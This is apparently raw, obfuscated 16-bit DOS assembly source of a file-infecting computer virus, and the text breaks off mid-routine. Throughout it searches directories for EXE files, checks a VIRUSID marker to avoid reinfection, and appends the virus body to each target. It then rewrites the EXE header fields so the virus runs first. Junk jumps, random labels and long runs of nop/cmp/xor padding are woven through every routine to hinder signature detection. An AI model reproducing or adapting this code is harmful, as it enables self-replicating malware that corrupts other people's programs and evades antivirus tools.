JMP SSNMG
GBIDA:
JNZ IJAVS
JMP QBO_J
IJAVS:
		int 21H 
BLCTV:
		call 	 KD_SH
FCAPV:
		call 	 HLCKH
VXAED:
		call 	 XCVSV
UIHCF:
		call 	 KHMBG
ZSCY_:
		call 	 SBJRJ
		jmp SHORT NEXTEXE 

FEC: 
	 pop di
		JMP 	OLKXS
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
OLKXS:
 	 mov BYTE PTR [di],0 
JZ TMRFO
JMP AGEA_
TMRFO:
		JMP 	UIHCF
KHMBG:
JZ HLUFR
JMP _WYAU
HLUFR:
JZ HLCKH
JMP FCAPV
HLCKH:
	 stc
SSNMG:
		call 	 GBIDA
UIVZV:
		call 	 ROBQC
RQLHE:
		call 	 UDVIP
AGEA_:
		call 	 TMRFO
_BWGE:
		call 	 AKDUO
	 ret

FENC:
	 pop di
QBO_J:
		call 	 IJAVS
LBBTL:
		call 	 LCDOS
	 ret
_WYAU:
OGGYM:
		call 	 HMAND
		call 	 HLUFR
OEUJG:
NZ_BH:
		call 	 WGC_H
G_QKD:
		call 	 N_BOR
		call 	 OYI_Q
LIFII:
FCLEV:
		call 	 MSYWB
		call 	 BJNSG
ELFZ_:
		call 	 BARNT
ZREFO:
JOCDE:
		call 	 ZUAUZ
		call 	 HXSEE
COHHP:
		call 	 FTSRC


FIRSTDIR:
	 call GET_DTA
	 push dx 
	 mov ah,1AH 
		cmp 	cx,dx
JNZ FTSRC
JMP COHHP
FTSRC:
		cmp 	cx,bx
JNZ HXSEE
JMP ZREFO
HXSEE:
		JMP 	_BWGE
AKDUO:
JNZ OYI_Q
JMP OEUJG
OYI_Q:
JNZ HMAND
JMP OGGYM
HMAND:
JNZ UDVIP
JMP RQLHE
UDVIP:
	 int 21H
	 mov dx,OFFSET USEFILE
JZ ZUAUZ
JMP JOCDE
ZUAUZ:
JZ BARNT
JMP ELFZ_
BARNT:
		JMP 	FCLEV
MSYWB:
JNZ BJNSG
JMP LIFII
BJNSG:
JZ N_BOR
JMP G_QKD
N_BOR:
JNZ LCDOS
JMP LBBTL
LCDOS:
		JMP 	UIVZV
ROBQC:
		JMP 	FGG_Z
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
FGG_Z:
	 mov cx,10H 
TYAZY:
JNZ WGC_H
JMP NZ_BH
WGC_H:
JZ KD_SH
JMP BLCTV
KD_SH:
		JMP 	D_VHX
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
D_VHX:
		JMP 	RRZHJ
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
RRZHJ:
	 mov ah,4EH 
		cmp 	bx,ax
JNZ BTDEV
JMP JUUHH
BTDEV:
JZ NZNVJ
JMP RRCHR
NZNVJ:
JNZ IJSGO
JMP VHJGY
IJSGO:
JNZ QJIWE
JMP XKAGH
QJIWE:
XKAGH:
		call 	 QJIWE
VHJGY:
		call 	 IJSGO
RRCHR:
		call 	 NZNVJ
JUUHH:
		call 	 BTDEV
	 int 21H

NEXTD1:
	 pop bx 
	 or al,al 
	 jz N12
	 JMP NEXTD3 
	 N12:
	 test BYTE PTR [bx+15H],10H 
	 jnz N13
	 JMP NEXTDIR 
	 N13:
	 cmp BYTE PTR [bx+1EH],’.’ 
	 je N14
	 JMP NEXTD2 
	 N14:
	 
NEXTDIR: 
	 call GET_DTA 
	 push dx
		JMP 	JOTOI
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
JOTOI:
		JMP 	LQEKE
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
LQEKE:
	 mov ah,1AH 
JZ XYQSV
JMP OESXT
XYQSV:
		JMP 	OUOHX
CKYSB:
	 int 21H
	 mov ah,4FH
JZ ZBRSJ
JMP WMOCL
ZBRSJ:
		JMP 	XKORR
HYPTH:
		JMP 	HQTMG
NEYEO:
	 int 21H 
HQTMG:
		call 	 NEYEO
OESXT:
		call 	 XYQSV
	 jmp NEXTD1 ;SHORT NEXTD1 -- uncomment for short jump

NEXTD2:
WMOCL:
		call 	 ZBRSJ
 	 xor al,al 

NEXTD3:
	 ret 
XKORR:
		call 	 HYPTH
OUOHX:
		call 	 CKYSB


GET_DTA:
		JMP 	KZZCX
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
KZZCX:
		JMP 	DVYFM
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
DVYFM:
		JMP 	VWLAI
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
VWLAI:
 mov dx,OFFSET DTA2
BSYMD:
KARJZ:
NEZFV:
KLVEF:
JZ RGBC_
JMP _SXTE
RGBC_:
JZ QAV_E
JMP NXWMN
QAV_E:
		JMP 	OSPKJ
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
OSPKJ:
 mov al,2BH
JZ GYDXF
JMP CIBHW
GYDXF:
JNZ FSKMX
JMP KVMKZ
FSKMX:
 mul [LEVEL]
 add dx,ax 
 ret
IIVRO:
		call 	 ZHNDQ
HNKEQ:
NXWMN:
		call 	 QAV_E
		call 	 XEZKQ
_SXTE:
		call 	 RGBC_
KVMKZ:
CIBHW:
		call 	 GYDXF
		call 	 FSKMX


CONCAT:
		JMP 	TSCQN
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
TSCQN:
		JMP 	SUTOS
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
SUTOS:
		JMP 	JGUOI
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
JGUOI:
	 mov al,byte ptr es:[di] 
JZ AWMNH
JMP EIICQ
AWMNH:
		JMP 	_GQWI
JBRAC:
		JMP 	HNKEQ
XEZKQ:
		JMP 	IIVRO
ZHNDQ:
	 inc di
	 or al,al
	 jnz CONCAT ;unmodified code be careful rit
	 dec di 
EIICQ:
		call 	 AWMNH
	 push di 

CONCAT2:
	 cld
	 lodsb 
	 stosb
	 or al,al
	 jnz CONCAT2 ;unmodified code be careful rit
	 pop di 
_GQWI:
		call 	 JBRAC
	 ret 	 
THJH_:
		call 	 JHFYO


FILE_OK:
	 call GET_EXE_HEADER 
	 jnc N15
	 JMP OK_END 
	 N15:
	 call CHECK_SIG_OVERLAY 
	 jnc N16
	 JMP OK_END 
	 N16:
	 call REL_ROOM 
	 jnc N17
	 JMP OK_END 
	 N17:
	 call IS_ID_THERE 

OK_END: ret 	 


CHECK_SIG_OVERLAY:
		JMP 	KFGVO
cmp ax,bx
cmp ax,bx
KFGVO:
		JMP 	MILUV
cmp cx,dx
cmp cx,dx
cmp cx,dx
MILUV:
		 mov al,’M’ 
JZ JHFYO
JMP THJH_
JHFYO:
		JMP 	JNLGI
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
JNLGI:
		JMP 	VJYJL
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
VJYJL:
		JMP 	GKOMP
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
GKOMP:
		 mov ah,’Z’
		JMP 	GOKFD
VSIQN:
JZ BAQ_M
JMP CZCDG
BAQ_M:
		JMP 	UNTZZ
IBWNE:
JNZ OXLIA
JMP DTTUV
OXLIA:
		JMP 	UUIEF
BDTEG:
		JMP 	_JUAG
OALKU:
		 cmp ax,WORD PTR [EXE_HDR]
		 jnz N18
		 JMP CSO_1
		 N18:
		 stc 
UNTZZ:
		call 	 IBWNE
CZCDG:
		call 	 BAQ_M
GOKFD:
		call 	 VSIQN
		 ret

CSO_1: 	 xor ax,ax
	     sub ax,WORD PTR [EXE_HDR+26]
_JUAG:
		call 	 OALKU
UUIEF:
		call 	 BDTEG
	     ret 
DTTUV:
		call 	 OXLIA


GET_EXE_HEADER:
	 mov dx,OFFSET USEFILE
QANVD:
		JMP 	CTDHG
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
CTDHG:
	 mov ax,3D02H 
	 int 21H
	 jnc N19
	 JMP RE_RET 
	 N19:
	 mov [HANDLE],ax 
	 mov bx,ax 
MGBXS:
JNZ _TQIS
JMP KWDMU
_TQIS:
JZ RGUQX
JMP BBAGT
RGUQX:
	 mov cx,1CH 
JNZ NDX_P
JMP DQHTV
NDX_P:
JNZ AMKEO
JMP IWXKD
AMKEO:
JZ FXHHU
JMP ASPAY
FXHHU:
	 mov dx,OFFSET EXE_HDR 
JZ SBBBV
JMP RS_VZ
SBBBV:
		JMP 	HEEVK
SCZJW:
	 mov ah,3FH
IWXKD:
		call 	 AMKEO
KWDMU:
		call 	 _TQIS
RS_VZ:
		call 	 SBBBV
DQHTV:
		call 	 NDX_P
	 int 21H

ASPAY:
		call 	 FXHHU
RE_RET: ret 
BBAGT:
		call 	 RGUQX


REL_ROOM:
		JMP 	RZFXF
xor bx,cx
xor bx,cx
RZFXF:
	 mov ax,WORD PTR [EXE_HDR+8] 
		JMP 	NDLLR
RRBRA:
	 add ax,ax
	 add ax,ax
	 sub ax,WORD PTR [EXE_HDR+6] 
	 add ax,ax
	 add ax,ax
	 sub ax,WORD PTR [EXE_HDR+24] 
HEEVK:
		call 	 SCZJW
ZGKLW:
		call 	 SISDC
NDLLR:
		call 	 RRBRA
	 cmp ax,4*NUMRELS 

IFTWR:
		call 	 JDTAY
FTDIK:
		call 	 XJOQL
XU_K_:
		call 	 QUPNM
RR_RET: ret     
TJVRU:
		call 	 QQAOL


IS_ID_THERE:
	 mov ax,WORD PTR [EXE_HDR+22] 
JNZ QQAOL
JMP TJVRU
QQAOL:
		JMP 	XU_K_
QUPNM:
JZ SISDC
JMP ZGKLW
SISDC:
JNZ XJOQL
JMP FTDIK
XJOQL:
	 add ax,WORD PTR [EXE_HDR+8] 
	 mov dx,16
	 mul dx
		JMP 	KBRSA
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
KBRSA:
		JMP 	OOEJX
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
OOEJX:
	 mov cx,dx
VOXDD:
		JMP 	CHSYM
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
CHSYM:
		JMP 	GLFOY
nop
nop
nop
nop
nop
nop
nop
GLFOY:
	 mov dx,ax 
		JMP 	XLNBC
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
XLNBC:
		JMP 	TEGUL
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
TEGUL:
	 mov bx,[HANDLE]
		JMP 	KBSPF
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
KBSPF:
	 mov ax,4200H 
	 int 21H
		JMP 	OLTYP
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
OLTYP:
	 mov ah,3FH
	 mov bx,[HANDLE]
		JMP 	BIYYP
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
BIYYP:
	 mov dx,OFFSET VIDC
XBOFM:
UEJTH:
JNZ H_ZCZ
JMP RXSU_
H_ZCZ:
	 mov cx,2 
HZAOU:
QXCRE:
JNZ JDTAY
JMP IFTWR
JDTAY:
	 int 21H
	 jnc N20
	 JMP II_RET 
	 N20:
		JMP 	YZGWV
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
YZGWV:
	 mov ax,[VIDC]
JNZ RUZGI
JMP AWHKN
RUZGI:
		JMP 	VM_LQ
ELSPG:
		JMP 	RWZWP
FISSS:
	 cmp ax,[VIRUSID] 
	 clc
	 jz N21
	 JMP II_RET 
	 N21:
RWZWP:
		call 	 FISSS
RXSU_:
		call 	 H_ZCZ
VM_LQ:
		call 	 ELSPG
MUIYT:
		call 	 UKSJZ
SEXXO:
		call 	 MZEAK
	 stc 

II_RET: ret
AWHKN:
OECZO:
		call 	 KEKDP
		call 	 RUZGI


SETBDY:
	 mov al,BYTE PTR [FSIZE]
		JMP 	OECZO
KEKDP:
		JMP 	SEXXO
MZEAK:
	 and al,0FH 
	 jnz N22
	 JMP SB_E 
	 N22:
	 mov cx,10H 
JZ UKSJZ
JMP MUIYT
UKSJZ:
JNZ GKOHK
JMP BKPDA
GKOHK:
	 sub cl,al 
		JMP 	ACACW
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
ACACW:
		JMP 	FWVED
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
FWVED:
	 mov dx,OFFSET FINAL
BAFA_:
	 add WORD PTR [FSIZE],cx 
	 adc WORD PTR [FSIZE+2],0
		JMP 	SVRNW
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
SVRNW:
		JMP 	NSZEP
nop
nop
nop
nop
nop
nop
nop
nop
NSZEP:
	 mov bx,[HANDLE]
		JMP 	ZYRHE
EMNQK:
		JMP 	FHIQB
xor bx,cx
FHIQB:
		JMP 	NJUAX
nop
NJUAX:
	 mov ah,40H 
JZ QIBFS
JMP CNLDP
QIBFS:
		JMP 	FWPXS
JWSJO:
JNZ FTCQJ
JMP QKFMO
FTCQJ:
A_BZN:
		call 	 YIFUF
GHVQU:
		call 	 OBOMX
ZYRHE:
		call 	 EMNQK
FWPXS:
		call 	 JWSJO
CNLDP:
		call 	 QIBFS
	 int 21H

SB_E: ret
AJLNW:
QKFMO:
		call 	 FTCQJ
		call 	 OUVRT
BKPDA:
		call 	 GKOHK
SIDLR:
		call 	 FOFJF
LTDVB:
PJNOP:
		call 	 VPYTH
		call 	 OEHCN
IRUQF:
_PLWR:
		call 	 VBHFK
FZXEQ:
		call 	 AWKHF
		call 	 DEQWS
KQNUH:
DAEBO:
		call 	 FP_SG
		call 	 OHTGP


INFECT:
	 mov cx,WORD PTR [FSIZE+2]
JNZ AWKHF
JMP FZXEQ
AWKHF:
JNZ VBHFK
JMP _PLWR
VBHFK:
	 mov dx,WORD PTR [FSIZE]
JZ OEHCN
JMP LTDVB
OEHCN:
		JMP 	SIDLR
FOFJF:
	 mov bx,[HANDLE]
JZ FP_SG
JMP DAEBO
FP_SG:
		JMP 	IRUQF
DEQWS:
	 mov ax,4200H 
JNZ OHTGP
JMP KQNUH
OHTGP:
JNZ OBOMX
JMP GHVQU
OBOMX:
	 int 21H 
	 call SETBDY 
	 mov cx,OFFSET FINAL 
WDRW_:
JNZ VPYTH
JMP PJNOP
VPYTH:
	 xor dx,dx 
	 mov bx,[HANDLE] 
RGFZU:
JNZ YIFUF
JMP A_BZN
YIFUF:
	 mov ah,40H 
CGPDH:
	 int 21H
	 mov dx,WORD PTR [FSIZE] 
		JMP 	QARXA
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
QARXA:
	 mov cx,WORD PTR [FSIZE+2]
	 mov bx,OFFSET REL1 
	 inc bx
	 add dx,bx
		JMP 	EJLIK
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
EJLIK:
	 mov bx,0
XLIEN:
QSTUV:
	 adc cx,bx 
	 mov bx,[HANDLE]
MSUHX:
		JMP 	AJLNW
OUVRT:
	 mov ax,4200H 
	 int 21H
	 mov dx,OFFSET EXE_HDR+14 
PIYZX:
		JMP 	UDHJK
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
UDHJK:
	 mov bx,[HANDLE] 
EJFD_:
	 mov cx,2
_SATJ:
ACY_W:
	 mov ah,40H 
YIYSR:
	 int 21H
	 mov dx,WORD PTR [FSIZE]
NVRZC:
VSZID:
QOHOX:
		JMP 	QWHLA
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
QWHLA:
	 mov cx,WORD PTR [FSIZE+2]
MGXIC:
WSUXW:
HICIL:
		JMP 	_ABJT
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
_ABJT:
	 mov bx,OFFSET REL1A 
VVXZO:
	 inc bx 
	 add dx,bx
		JMP 	GGHXP
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
GGHXP:
	 mov bx,0
XKDNC:
	 adc cx,bx 
		JMP 	YYIPE
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
YYIPE:
	 mov bx,[HANDLE]
FIRXP:
TGWIR:
	 mov ax,4200H 
	 int 21H
		JMP 	VMHQG
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
VMHQG:
	 mov dx,OFFSET EXE_HDR+16 
KQUSG:
WQKHD:
	 mov bx,[HANDLE] 
BVORE:
	 mov cx,2
	 mov ah,40H 
KSHGU:
	 int 21H
		JMP 	IBKUK
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
IBKUK:
	 mov dx,WORD PTR [FSIZE]
JDFRR:
	 mov cx,WORD PTR [FSIZE+2]
NUEBA:
BDG_Y:
VAZR_:
DEFJK:
	 mov bx,OFFSET REL2 
WAUGP:
UQS_K:
JSZMV:
	 add bx,1 
	 add dx,bx
	 mov bx,0
VPPQI:
UPQTK:
	 adc cx,bx 
		JMP 	_X_OD
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
_X_OD:
	 mov bx,[HANDLE]
	 mov ax,4200H 
	 int 21H
	 mov dx,OFFSET EXE_HDR+20 
KYFZG:
		JMP 	VZHVZ
nop
nop
VZHVZ:
	 mov bx,[HANDLE]
QWKBL:
	 mov cx,4
_S_BL:
	 mov ah,40H 
MEZTX:
OEOMR:
	 int 21H
	 xor cx,cx
	 xor dx,dx
	 mov bx,[HANDLE]
	 mov ax,4200H 
QMRGT:
IILAL:
RBTIA:
	 int 21H
	 mov ax,WORD PTR [FSIZE] 
		JMP 	DGADP
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
DGADP:
	 mov cl,4 
ZTPAZ:
O_IGJ:
	 shr ax,cl 
	 mov bx,WORD PTR [FSIZE+2]
	 and bl,0FH
	 mov cl,4
IBTSJ:
IGGES:
KWHFK:
SKXBL:
	 shl bl,cl
	 add ah,bl
	 sub ax,WORD PTR [EXE_HDR+8] 
		JMP 	PUPFU
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
PUPFU:
	 mov WORD PTR [EXE_HDR+22],ax
	 mov bx,OFFSET FINAL 
TQ_OP:
	 add bx,10H 
	 mov cl,4 
NXZSV:
	 shr bx,cl
	 add ax,bx
		JMP 	HZUDA
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
HZUDA:
	 mov WORD PTR [EXE_HDR+14],ax 
QRW_D:
ABELL:
		JMP 	FAAYA
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
FAAYA:
	 mov ax,OFFSET VIRUS 
WACWY:
UFPVT:
	 mov WORD PTR [EXE_HDR+20],ax 
JZYBK:
QCVSW:
AFOMQ:
UIFJO:
	 mov ax,STACKSIZE 
UFYTX:
XBRCS:
		JMP 	HXJBT
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
HXJBT:
		JMP 	SV_JX
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
SV_JX:
	 mov WORD PTR [EXE_HDR+16],ax ;and save it
LM_BC:
		JMP 	UOTFO
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
UOTFO:
	 mov dx,WORD PTR [FSIZE+2]
KMRHS:
	 mov ax,WORD PTR [FSIZE] 
QMLMF:
WLOOR:
	 mov bx,OFFSET FINAL
	 add ax,bx
	 xor bx,bx
	 adc dx,bx 
	 add ax,200H 
	 adc dx,bx
	 push ax
		JMP 	BOPAH
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
BOPAH:
	 mov cl,9
VQDWH:
LXXNN:
ROFZA:
	 shr ax,cl
	 mov cl,7
NIJW_:
WPFRK:
	 shl dx,cl
	 add ax,dx
	 mov WORD PTR [EXE_HDR+4],ax 
EUBFZ:
K_MCZ:
	 pop ax
	 and ax,1FFH 
	 mov WORD PTR [EXE_HDR+2],ax 
TSMLA:
	 mov ax,NUMRELS 
LMHAD:
	 add WORD PTR [EXE_HDR+6],ax
	 mov cx,1CH 
SJITJ:
		JMP 	CAMKD
nop
nop
CAMKD:
	 mov dx,OFFSET EXE_HDR
ZBAPA:
	 mov bx,[HANDLE]
HICPE:
	 mov ah,40H 
WYFZB:
CGKAG:
	 int 21H
		JMP 	IO_FQ
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
IO_FQ:
	 mov ax,WORD PTR [EXE_HDR+6] 
QUHJP:
KJXNV:
TMNLJ:
	 dec ax 
	 dec ax 
		JMP 	TZPYU
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
TZPYU:
	 mov bx,4 
	 mul bx
	 add ax,WORD PTR [EXE_HDR+24]
	 mov bx,0
	 adc dx,bx 
	 mov cx,dx
BJUJB:
	 mov dx,ax
PBKDY:
		JMP 	MYX_R
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
MYX_R:
		JMP 	BDZWV
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
BDZWV:
	 mov bx,[HANDLE]
NUAMT:
ILHHO:
	 mov ax,4200H 
NLJOQ:
OZTAO:
	 int 21H
	 mov ax,WORD PTR [EXE_HDR+22]
	 mov bx,OFFSET REL1 
CNHRL:
	 inc bx 
	 mov WORD PTR [EXE_HDR],bx 
VTKNZ:
CIIRE:
		JMP 	KKNMB
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
KKNMB:
	 mov WORD PTR [EXE_HDR+2],ax 
	 mov ax,WORD PTR [EXE_HDR+22]
KZOWV:
		JMP 	ILRRA
WXREC:
	 mov bx,OFFSET REL2
		JMP 	BMCRR
KUBDI:
	 add bx,3 
	 mov WORD PTR [EXE_HDR+4],bx 
ZPQKI:
		JMP 	A_KLH
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
A_KLH:
	 mov WORD PTR [EXE_HDR+6],ax
JZ FTGVA
JMP ZQWVN
FTGVA:
		JMP 	ANEDY
cmp cx,dx
cmp cx,dx
cmp cx,dx
ANEDY:
		JMP 	GOMFA
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
GOMFA:
	 mov cx,8 
BNFNO:
JNZ JKLKN
JMP ZUSGX
JKLKN:
		JMP 	GGIR_
nop
nop
nop
nop
nop
nop
nop
GGIR_:
	 mov dx,OFFSET EXE_HDR
	 mov bx,[HANDLE]
	 mov ah,40H 
	 int 21H
	 ret 
ILRRA:
ZUSGX:
		call 	 JKLKN
		call 	 WXREC

BMCRR:
		call 	 KUBDI


TIMECT EQU 63 
ZQWVN:
KPTZB:
		call 	 WZNVK
		call 	 FTGVA


SHOULDRUN:
NKVMQ:
		call 	 OGHDM
	 xor ah,ah 

SR1: ret 
 	 int 1AH
 	 and dl,TIMECT 
AYKTQ:
		call 	 FXMZP
HYAPT:
		call 	 WDCS_
 	 ret ;
XOEGO:
		call 	 NFNIR



SETSR:
		JMP 	TDWVL
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
TDWVL:
	 mov al,90H 
	 mov BYTE PTR SR1,al 
JZ WZNVK
JMP KPTZB
WZNVK:
PZDNS:
		call 	 JGOXP
	 ret
GUSQF:
		call 	 GSXOK
QVPJD:
		call 	 LYOLI
SZATE:
		call 	 MGQKV
PAEAC:
		call 	 JQRDN


NEW_DTA:
	 mov ah,2FH 
JNZ MGQKV
JMP SZATE
MGQKV:
JNZ OGHDM
JMP NKVMQ
OGHDM:
	 int 21H
	 mov WORD PTR [OLDDTA],bx
		JMP 	XOEGO
NFNIR:
	 mov ax,es
JZ JQRDN
JMP PAEAC
JQRDN:
JZ WDCS_
JMP HYAPT
WDCS_:
JNZ FXMZP
JMP AYKTQ
FXMZP:
	 mov WORD PTR [OLDDTA+2],ax
		JMP 	RHHVQ
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
RHHVQ:
	 mov ax,cs
IWNOF:
NWQWK:
JNZ LYOLI
JMP QVPJD
LYOLI:
	 mov es,ax 
KBLOI:
	 mov dx,OFFSET DTA1 
		JMP 	PZDNS
JGOXP:
	 mov ah,1AH
XPNVI:
JZQJ_:
XVCOH:
JZ IXXMU
JMP EVFGN
IXXMU:
JZ NNOQW
JMP IBGQY
NNOQW:
JZ BIRNO
